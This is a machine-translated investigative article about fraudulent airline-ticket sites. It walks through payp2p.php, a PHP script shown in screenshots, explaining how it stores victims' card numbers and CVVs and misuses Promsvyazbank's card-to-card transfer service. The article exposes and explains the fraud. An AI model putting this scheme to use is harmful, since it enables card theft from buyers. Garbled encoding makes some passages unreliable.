<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üêá ‚õπüèø üö∑ Voos baratos ... Uma rede de sites fraudulentos roubando dinheiro de cart√µes. A segunda investiga√ß√£o. O que o Promsvyazbank tem a ver com isso? üñïüèΩ ‚ô£Ô∏è üññüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="H√° cerca de um m√™s, publiquei um artigo no Geektimes: ‚ÄúPassagens a√©reas baratas ... Ou uma rede de sites fraudulentos roubando dinheiro de cart√µes. Mi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Voos baratos ... Uma rede de sites fraudulentos roubando dinheiro de cart√µes. A segunda investiga√ß√£o. O que o Promsvyazbank tem a ver com isso?</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/398313/"><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
H√° cerca de um m√™s, publiquei um artigo no Geektimes: </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚ÄúPassagens a√©reas baratas ... Ou uma rede de sites fraudulentos roubando dinheiro de cart√µes. </font><font style="vertical-align: inherit;">Minha investiga√ß√£o. </font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A publica√ß√£o recebeu uma √≥tima resposta e uma continua√ß√£o inesperada ...</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Deixe-me lembr√°-lo para quem ainda n√£o leu a primeira parte. Em uma publica√ß√£o baseada em casos reais, foram descritos esquemas usando os fraudadores que roubam dinheiro de passagens de compradores de passagens a√©reas que eram imprudentes em acessar um site falso de vendas de passagens. O n√∫mero de sites fraudulentos para a venda de passagens a√©reas na RuNet √© de dezenas e centenas (inclusive fechados). Nesses sites, o usu√°rio recebe primeiro informa√ß√µes reais sobre voos; prop√µe-se fazer um pedido e pagar com cart√£o de cr√©dito. Tudo fica bonito at√© os compradores de passagens a√©reas descobrirem que ficam sem dinheiro e sem passagens.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em todos os casos detectados, para roubar dinheiro, esses sites usam os servi√ßos dos bancos para transferir dinheiro de cart√£o para cart√£o (P2P). Na primeira parte, o mecanismo de como a p√°gina do Tinkov Bank para pagamento de cart√£o em cart√£o √© disfar√ßada e incorporada em sites fraudulentos, para que o "comprador" n√£o perceba nada, foi descrito em detalhes. O Promsvyazbank tamb√©m foi mencionado - foi atrav√©s dele que o dinheiro foi roubado do cart√£o da v√≠tima na hist√≥ria descrita. E se n√£o restavam d√∫vidas no banco TKS, no caso do Promsvyazbank n√£o estava claro como o dinheiro foi retirado. O script principal usado para roubar dinheiro foi executado no lado do servidor e sem os c√≥digos-fonte, era poss√≠vel assumir apenas o que estava fazendo.</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E um dos usu√°rios do Geektimes entrou em contato comigo e enviou o script payp2p.php que foi usado recentemente na maioria dos sites fraudulentos de venda de passagens a√©reas. </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Este script usa o servi√ßo Promsvyazbank para transferir de cart√£o para cart√£o. </font><font style="vertical-align: inherit;">E, na minha opini√£o, o Promsvyazbank, fornecendo seu servi√ßo, que era f√°cil de enganar, contribuiu para o crescimento do n√∫mero de golpistas da Internet.</font></font><a name="habracut"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Provavelmente existem outros bancos semelhantes, mas esta publica√ß√£o lidar√° principalmente com o Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de come√ßarmos a an√°lise do script, vamos ver como era a p√°gina de pagamento de um site fraudulento e como era a p√°gina de tradu√ß√£o de um cart√£o para um cart√£o do Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parecia a p√°gina de pagamento em sites fraudulentos</font></font><br>
<img src="https://habrastorage.org/files/fe3/cf3/6d5/fe3cf36d5d294c8aa50b4338e9efde03.jpg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ao analisar o c√≥digo HTML desta p√°gina de pagamento, n√£o encontrei nenhuma parte das p√°ginas de nenhum banco, iframes internos n√£o s√£o usados, scripts n√£o s√£o usados, e a p√°gina em si √© muito simples e n√£o se parece com a p√°gina do Promsvyazbank. Os dados inseridos no formul√°rio s√£o verificados n√£o por scripts, mas por mecanismos incorporados nos navegadores, usando os atributos "padr√£o" e "necess√°rio" para os campos de entrada e para as listas suspensas selecionadas. I.e. at√© a p√°gina armazenada no navegador na unidade local permanece ‚Äúoperacional‚Äù e pode ser usada para testar como os dados do mapa s√£o interceptados. Uma p√°gina semelhante salva anteriormente foi usada como parte desta publica√ß√£o para entender como o script funciona.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De fato, esta p√°gina √© apenas um formul√°rio para inserir um n√∫mero de cart√£o. </font><font style="vertical-align: inherit;">Quando o formul√°rio √© confirmado, o processamento √© transferido para o programa payp2p.php.</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"b-card-feature-list clearfix"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"formPay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"payp2p.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Payp2p.php pode fazer qualquer coisa. </font><font style="vertical-align: inherit;">O c√≥digo dela anteriormente n√£o estava dispon√≠vel para n√≥s, pois √© executado no lado do servidor. </font><font style="vertical-align: inherit;">Mas como j√° escrevi, agora temos um c√≥digo e saberemos tudo. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora vamos ver como a p√°gina de pagamento fica de um cart√£o para outro no site do Promsvyazbank. </font></font><br>
<br>
<code>https://www.psbank.ru/Personal/eCommerce/Card2Card</code><br>
<img src="https://habrastorage.org/files/40d/469/71c/40d46971c2414e28bd4ef695c1e0d665.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como voc√™ pode ver, a p√°gina do Promsvyazbank n√£o √© como a p√°gina de pagamento apresentada anteriormente. </font><font style="vertical-align: inherit;">Mesmo o n√∫mero de campos de entrada para o n√∫mero do cart√£o n√£o corresponde. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vejamos o c√≥digo HTML da p√°gina PSB para descobrir como funciona. </font><font style="vertical-align: inherit;">Tudo o que precisamos saber √© nestas poucas linhas:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"card2card"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/P2P/card_form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">seamless</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta parte significa que a p√°gina de pagamento real est√° localizada em um dom√≠nio diferente e o que vemos no site do Promsvyazbank √© exibido em uma "janela" usando a tecnologia iframe. </font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gostaria de saber quem possui o dom√≠nio 3ds.payment.ru.</font></font></b><div class="spoiler_text">   Whois.<br>
<br>
<code> 3ds.payment.ru<br>
IP 193.200.10.116<br>
 : PRSBM-NET <br>
:<br>
inetnum: 193.200.10.0 - 193.200.10.255<br>
netname: PRSBM-NET<br>
mnt-by: PROMSVYAZBANK-MNT<br>
<br>
C    online.payment.ru<br>
<img src="https://habrastorage.org/files/78b/0d3/8be/78b0d38be13f47f58128095526817a54.png"><br>
</code><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O dom√≠nio 3ds.payment.ru tamb√©m pertence ao Promsvyazbank. Lembraremos deste dom√≠nio, ele ainda ser√° encontrado na descri√ß√£o mais de uma vez. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver qual √© a p√°gina que o Promsvyazbank incorpora em seu site, e possivelmente em outros sites. </font></font><br>
<br>
<code>https://3ds.payment.ru/P2P/card_form.html</code><br>
<img src="https://habrastorage.org/files/bf7/543/441/bf754344157647e1acf1fb55454c3179.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta √© uma p√°gina real usada para transfer√™ncias de cart√£o para cart√£o. Como voc√™ pode ver, esta p√°gina n√£o tem bordas. Isso √© feito de prop√≥sito para tornar mais conveniente a cria√ß√£o em outros sites. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No c√≥digo HTML desta p√°gina, estamos interessados ‚Äã‚Äãnesta parte: </font></font><br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estes s√£o campos de entrada ocultos para armazenar informa√ß√µes de servi√ßo. Tamb√©m nos lembraremos desta p√°gina. E onde √© usado ser√° descrito mais adiante. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A parte introdut√≥ria acabou, vamos para a parte mais interessante e vejamos como o script payp2p.php funciona ou como ele funciona.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script √© simples e n√£o requer nenhum conhecimento aprofundado da linguagem de programa√ß√£o PHP para entend√™-lo. Por conveni√™ncia, eu quebrei em peda√ßos. √Ä esquerda, est√£o os n√∫meros de linha que podem ser referenciados. O script √© completamente inalterado na forma em que foi recebido. Ap√≥s cada parte do c√≥digo, ser√° apresentada uma descriptografia e um exemplo dos valores das vari√°veis ‚Äã‚Äãdurante a execu√ß√£o do programa (isto √©, algo semelhante √† depura√ß√£o). Em alguns lugares, coment√°rios excessivos s√£o poss√≠veis - isso √© feito para que os leitores que n√£o s√£o de programa√ß√£o tamb√©m possam entender o significado do c√≥digo do programa.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para o teste, precisamos de um formul√°rio no qual voc√™ precisar√° inserir os dados do cart√£o com o qual o pagamento √© suposto. Usaremos o formul√°rio salvo anteriormente. A apar√™ncia do formul√°rio em um site fraudulento √© mostrada na figura no in√≠cio do artigo. Sobre o formul√°rio ser√° escrito mais abaixo. Para o teste, digite o n√∫mero do cart√£o 1111.2222.3333.4444. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos come√ßar. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f45/3a9/754/f453a9754241406eb6089527f5e25336.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 3 - n√£o executa nenhum comando. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 4 - Um arquivo dbconfig.php separado √© carregado no qual os par√¢metros para conex√£o com o banco de dados MySQL s√£o armazenados. Uma captura de tela do c√≥digo dbconfig.php e sua an√°lise est√£o abaixo.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 6 - nos conectamos ao servidor MySQL, no banco de dados do qual iremos armazenar dados sobre cart√µes roubados e transfer√™ncias de dinheiro feitas. Essa linha se conecta simultaneamente ao servidor MySQL e sai do programa se a conex√£o falhar por algum motivo. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 11 - selecione a codifica√ß√£o para trabalhar com o banco de dados MySQL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 13 - Conectamos ao servidor MySQL anteriormente, agora selecionamos o banco de dados com o qual iremos trabalhar. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script payp2p.php inicia seu trabalho depois que um usu√°rio enganado preenche um formul√°rio em uma p√°gina semelhante a uma p√°gina de pagamento online comum. Ao clicar no bot√£o "Pagar" no formul√°rio, o script payp2p.php recebe os dados inseridos no formul√°rio. Os dados do formul√°rio para o script s√£o transmitidos usando o m√©todo POST.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 16 - o n√∫mero do cart√£o de cr√©dito inserido no formul√°rio na p√°gina anterior √© salvo na vari√°vel $ num. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 17 - o m√™s / ano do per√≠odo de validade do cart√£o √© armazenado na vari√°vel $ date. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 18 - o c√≥digo CVV do cart√£o √© salvo na vari√°vel $ cvv. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 19 - na vari√°vel $ code, um certo c√≥digo √© gerado anteriormente ao fazer o "pedido de passagens a√©reas". Este c√≥digo √© usado para que o usu√°rio possa visualizar seu pedido atrav√©s de um link especial. O mesmo c√≥digo √© usado para identificar o pedido (na p√°gina de pagamento, para exibir automaticamente o valor do pagamento; se salvo pelos golpistas ao salvar no ‚Äúlivro de vendas‚Äù, esse c√≥digo tamb√©m √© transmitido para a forma de pagamento, provavelmente como um identificador de transfer√™ncia (mais sobre isso abaixo).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 21-22 Uma linha √© formada - uma consulta SQL, que √© ent√£o executada. </font><font style="vertical-align: inherit;">A consulta SQL adiciona √† tabela 'cart√£o' os valores do identificador do pedido, valor, per√≠odo de validade do cart√£o, c√≥digo CVV do cart√£o e a hora atual exata. </font><font style="vertical-align: inherit;">Um exemplo de registro no banco de dados est√° abaixo.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/051/283/424/0512834248fd4c1fa7498ed3f98e72e7.png"><br>
<br>
        ¬´ ¬ª      ¬´ ¬ª.    ,     .    .<br>
<br>
"√¢√°√®√¢" = ''    ISO8859-1 =&gt;Windows-1251<br>
  ,  .  .</div></div> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Volte nossa aten√ß√£o temporariamente para o arquivo dbconfig.php. </font></font><br>
<br>
<img src="https://habrastorage.org/files/100/d2a/13b/100d2a13b3544f60afeeab0efc768b85.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui est√£o os par√¢metros para conectar-se ao banco de dados. </font><font style="vertical-align: inherit;">Pelo que pode ser interessante:</font></font><br>
<br>
<blockquote>DBHOST ‚Äî  ,    MySQL  (    MySQL     ,     ,       )<br>
DBNAME ‚Äî   <br>
DBUSER ‚Äî        MySQL<br>
DBPASS ‚Äî       MySQL <br>
SECURE_AUTH_KEY ‚Äî      -   .      ,   ,    , .     .</blockquote><br>
<img src="https://habrastorage.org/files/c5c/9bf/0b1/c5c9bf0b1afb4d8ba298ce8953076dee.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 28 - um arquivo aviacfg.php de terceiros est√° conectado. Este √© um arquivo de configura√ß√£o que armazena n√∫meros de cart√£o de destinat√°rio e outras configura√ß√µes. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 29 - Uma matriz √© criada a partir dos n√∫meros dos cart√µes separados por uma quebra de linha no arquivo de configura√ß√£o. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 30-31 - A vari√°vel $ crd recebe aleatoriamente o n√∫mero de uma das cartas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver o que temos no arquivo aviacfg.php</font></font><br>
<br>
<img src="https://habrastorage.org/files/14b/2bd/b16/14b2bdb16dc74b7990b743146d9bc72c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui vemos que a vari√°vel $ aviacfg √© uma matriz que cont√©m os valores de desconto (desconto) e cart√µes (n√∫meros de cart√µes para os quais s√£o esperados levantamentos). Neste exemplo, h√° apenas um n√∫mero de cart√£o, mas pode haver qualquer n√∫mero deles. O nome do arquivo (aviacfg.php) e a vari√°vel ($ aviacfg) indicam em qual √°rea esse script foi aprimorado. O valor do desconto determina a porcentagem de pre√ßos em um site fraudulento que ser√° mostrado mais barato do que realmente √© vendido em um site de passagens a√©reas ‚Äúhonesto‚Äù. O propriet√°rio de um site fraudulento pode rapidamente tornar o pre√ßo dos ingressos exibido mais barato. Quanto menor o pre√ßo exibido, maior a probabilidade de um dos potenciais compradores arriscar comprar bilhetes em um site desconhecido. Sobre o desconto, haver√° um coment√°rio posterior sobre exatamente como ele √© implementado no c√≥digo.</font></font><br>
<br>
<img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al√©m disso, o valor da transfer√™ncia, o n√∫mero do cart√£o para o qual a transfer√™ncia √© feita e o c√≥digo que identifica o pedido de passagens a√©reas em um site fraudulento s√£o armazenados no Banco de Dados MySQL. </font><font style="vertical-align: inherit;">Um exemplo de registro no banco de dados ser√° apresentado abaixo.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/4ee/0e7/b46/4ee0e7b46d584bb68631adb4339b86e9.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/111/e13/e09/111e13e09e2246b4bbb9a3cdb6cab651.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 40 - a vari√°vel $ p112 recebe um valor com o n√∫mero do cart√£o que foi inserido anteriormente no formul√°rio. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 41-51 - O n√∫mero do cart√£o √© dividido em partes de quatro d√≠gitos. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 53-57 - O comprimento do n√∫mero do cart√£o √© verificado. Se no n√∫mero do cart√£o o n√∫mero de caracteres for diferente de 16 ou 18, ocorrer√° uma sa√≠da. Uma mensagem √© exibida por cinco segundos e depois redirecionada para outra p√°gina. Neste exemplo, o retorno ser√° para a p√°gina do pedido no site fraudulento. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Na linha 56 "Iaaa? Iua aaiiua ea? Ou" ao converter a codifica√ß√£o ISO8859-1 =&gt; Windows-1251 corresponde ao texto: "Dados inv√°lidos do cart√£o". </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 58-61 - as vari√°veis ‚Äã‚Äã$ p4, $ p5, $ p6, $ p11 recebem os valores inseridos anteriormente no formul√°rio (data de validade do cart√£o, c√≥digo CVV, valor do pagamento).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 63 - Na vari√°vel $ info, todos os dados do cart√£o e o valor da transfer√™ncia s√£o salvos. </font><font style="vertical-align: inherit;">Ao formar, as quebras de linha "\ n" e os separadores "### ..." s√£o usados. </font><font style="vertical-align: inherit;">Essa vari√°vel n√£o √© usada em nenhum outro lugar. </font><font style="vertical-align: inherit;">Ao finalizar o script, ele pode ser usado para salvar registros em um arquivo de texto comum ou para exibi√ß√£o durante a depura√ß√£o.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/413/f55/39d/413f5539d0fa45f3aee1853c62d0005f.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/347/9f7/0d5/3479f70d54804bb2b25f111021820c1c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 66-75 - Na verdade, √© uma duplica√ß√£o do bloco de linhas 27-36. Mais uma vez, o cart√£o receptor √© selecionado aleatoriamente no arquivo de configura√ß√£o aviacfg.php, e tudo isso √© salvo na tabela do banco de dados card_balance. Assim, na tabela card_balance, a cada tentativa de transfer√™ncia, dois registros ser√£o criados. Se apenas um cart√£o de destinat√°rio estiver entupido no aviacfg.php, com amostragem aleat√≥ria, √© claro, o mesmo cart√£o ser√° sempre selecionado. Nesse caso, as entradas na tabela card_balance ser√£o simplesmente duplicadas. Por√©m, se v√°rios n√∫meros de cart√µes estiverem obstru√≠dos no aviacfg.php, com amostragem aleat√≥ria, os resultados ser√£o diferentes e haver√° um registro na tabela card_balance, o primeiro est√° incorreto e o segundo est√° correto.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Isso √© um erro, e os compradores do script (haver√° um coment√°rio separado sobre eles) podem pedir ao desenvolvedor para compensar os danos morais associados ao fato de as tradu√ß√µes reais serem pelo menos duas vezes menores que as entradas de log.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/33b/867/4db/33b8674db56f462ba652d8caf33b418a.png"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de entradas do banco de dados MySQL</font></font></b><div class="spoiler_text">        .           : ¬´card¬ª  ¬´card_balance¬ª.               ,             .<br>
<br>
,         , ‚Äî   .      .<br>
<br>
 ¬´card¬ª.<br>
<br>
<img src="https://habrastorage.org/files/4e9/e3c/454/4e9e3c45420a4d84b73a857184fe7155.jpg"><br>
<br>
 ¬´card_balance¬ª.<br>
<img src="https://habrastorage.org/files/98c/4a0/355/98c4a03559ba40e8a46adb2fdf950b54.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Observe que, no primeiro caso, apenas os cart√µes de remetente sem valor, mas com a hora exata, s√£o armazenados na tabela do banco de dados MySQL e, no segundo caso, os dados sobre as transfer√™ncias feitas (mais precisamente, sobre as tentativas de transfer√™ncia) s√£o salvos. </font><font style="vertical-align: inherit;">O n√∫mero e o valor do cart√£o do destinat√°rio s√£o salvos, os dados do remetente n√£o s√£o salvos na segunda tabela. </font><font style="vertical-align: inherit;">Nos dois casos, o "ID do pedido" √© armazenado adicionalmente.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A primeira parte do script, descrita acima, pode ser arbitrariamente chamada de "entrada no livro de vendas para contabilidade". Ela n√£o tem rela√ß√£o com a transfer√™ncia de dinheiro. Para transferir dinheiro, voc√™ pode fazer sem salvar dados no banco de dados. No entanto, vemos que os dados do cart√£o s√£o salvos, o que significa que, no futuro, eles poder√£o ser usados ‚Äã‚Äãadicionalmente para roubar dinheiro dos cart√µes "no modo manual". Os dados do cart√£o podem ser vendidos ou usados, por exemplo, para pagar pela publicidade no Yandex.Direct, conforme mostrado no artigo anterior. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A segunda parte do script refere-se √† transfer√™ncia de dinheiro atrav√©s do site Promsvyazbank 3ds.payment.ru. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2b4/0cb/7fc/2b40cb7fc61f4b9598409fbfcc5ae00f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A linha 78 do coment√°rio indica que se sup√µe que a p√°gina de confirma√ß√£o para um pagamento bem-sucedido tenha um endere√ßo como "/sus.php?cd=BX3FKT". Se for bem-sucedido, o usu√°rio dever√° retornar para este endere√ßo.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 80-91 Para realizar uma tradu√ß√£o, voc√™ deve primeiro ir para a p√°gina de servi√ßo. </font></font><br>
<br>
<code>https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<img src="https://habrastorage.org/files/e04/5eb/8e4/e045eb8e4a4d42c6be37ff2946da439c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta p√°gina exibe algo como esta linha:</font></font><br>
<br>
<pre><code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"ORDER_NUM"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425023400"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"TIMESTAMP"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425"</span></span>}</code></pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
"ORDER_NUM" √© ~ "N√∫mero do pedido", "TIMESTAMP" √© o carimbo de data / hora atual. Se a p√°gina for atualizada, novos dados ser√£o sempre emitidos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para ler uma p√°gina da web ou enviar dados para uma p√°gina da web, use o comando curl. A ondula√ß√£o (cURL) permite conectar-se programaticamente a servidores da Web usando v√°rios protocolos, incluindo http e https. No nosso caso, curl √© um navegador de software que pode salvar p√°ginas da web em vari√°veis. A p√°gina armazenada na vari√°vel √© uma linha muito longa com o c√≥digo-fonte HTML desta p√°gina. Voc√™ pode trabalhar com essas vari√°veis ‚Äã‚Äãde string da mesma maneira que com qualquer string - voc√™ pode procurar por texto, substituir texto etc. A ondula√ß√£o nos scripts descritos ser√° usada v√°rias vezes.</font></font><br>
